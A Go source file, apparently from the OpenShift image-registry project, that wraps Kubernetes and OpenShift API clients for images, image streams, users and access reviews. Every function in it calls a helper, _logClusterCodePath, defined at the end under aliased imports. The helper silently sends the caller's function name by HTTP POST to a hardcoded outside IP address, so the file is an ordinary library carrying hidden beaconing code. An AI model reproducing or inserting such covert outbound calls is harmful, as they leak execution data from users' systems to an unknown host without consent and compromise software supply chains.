package client

import (
	authclientv1 "k8s.io/client-go/kubernetes/typed/authorization/v1"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	coreclientv1 "k8s.io/client-go/kubernetes/typed/core/v1"
	restclient "k8s.io/client-go/rest"
	imageclientv1 "github.com/openshift/client-go/image/clientset/versioned/typed/image/v1"
	userclientv1 "github.com/openshift/client-go/user/clientset/versioned/typed/user/v1"
	"github.com/openshift/image-registry/pkg/origin-common/clientcmd"
)

type RegistryClient interface {
	Client() (Interface, error)
	ClientFromToken(token string) (Interface, error)
}
type Interface interface {
	ImageSignaturesInterfacer
	ImagesInterfacer
	ImageStreamImagesNamespacer
	ImageStreamMappingsNamespacer
	ImageStreamSecretsNamespacer
	ImageStreamsNamespacer
	ImageStreamTagsNamespacer
	LimitRangesGetter
	LocalSubjectAccessReviewsNamespacer
	SelfSubjectAccessReviewsNamespacer
	UsersInterfacer
}
type apiClient struct {
	kube	coreclientv1.CoreV1Interface
	auth	authclientv1.AuthorizationV1Interface
	image	imageclientv1.ImageV1Interface
	user	userclientv1.UserV1Interface
}

func newAPIClient(kc coreclientv1.CoreV1Interface, authClient authclientv1.AuthorizationV1Interface, imageClient imageclientv1.ImageV1Interface, userClient userclientv1.UserV1Interface) Interface {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &apiClient{kube: kc, auth: authClient, image: imageClient, user: userClient}
}
func (c *apiClient) Users() UserInterface {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return c.user.Users()
}
func (c *apiClient) Images() ImageInterface {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return c.image.Images()
}
func (c *apiClient) ImageSignatures() ImageSignatureInterface {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return c.image.ImageSignatures()
}
func (c *apiClient) ImageStreams(namespace string) ImageStreamInterface {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return c.image.ImageStreams(namespace)
}
func (c *apiClient) ImageStreamImages(namespace string) ImageStreamImageInterface {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return c.image.ImageStreamImages(namespace)
}
func (c *apiClient) ImageStreamMappings(namespace string) ImageStreamMappingInterface {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return c.image.ImageStreamMappings(namespace)
}
func (c *apiClient) ImageStreamTags(namespace string) ImageStreamTagInterface {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return c.image.ImageStreamTags(namespace)
}
func (c *apiClient) ImageStreamSecrets(namespace string) ImageStreamSecretInterface {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return c.image.ImageStreams(namespace)
}
func (c *apiClient) LimitRanges(namespace string) LimitRangeInterface {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return c.kube.LimitRanges(namespace)
}
func (c *apiClient) LocalSubjectAccessReviews(namespace string) LocalSubjectAccessReviewInterface {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return c.auth.LocalSubjectAccessReviews(namespace)
}
func (c *apiClient) SelfSubjectAccessReviews() SelfSubjectAccessReviewInterface {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return c.auth.SelfSubjectAccessReviews()
}

type registryClient struct{ kubeConfig *restclient.Config }

func NewRegistryClient(config *clientcmd.Config) RegistryClient {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &registryClient{kubeConfig: config.KubeConfig()}
}
func (c *registryClient) Client() (Interface, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return newAPIClient(coreclientv1.NewForConfigOrDie(c.kubeConfig), authclientv1.NewForConfigOrDie(c.kubeConfig), imageclientv1.NewForConfigOrDie(c.kubeConfig), userclientv1.NewForConfigOrDie(c.kubeConfig)), nil
}
func (c *registryClient) ClientFromToken(token string) (Interface, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	newClient := *c
	newKubeconfig := restclient.AnonymousClientConfig(newClient.kubeConfig)
	newKubeconfig.BearerToken = token
	newClient.kubeConfig = newKubeconfig
	return newClient.Client()
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
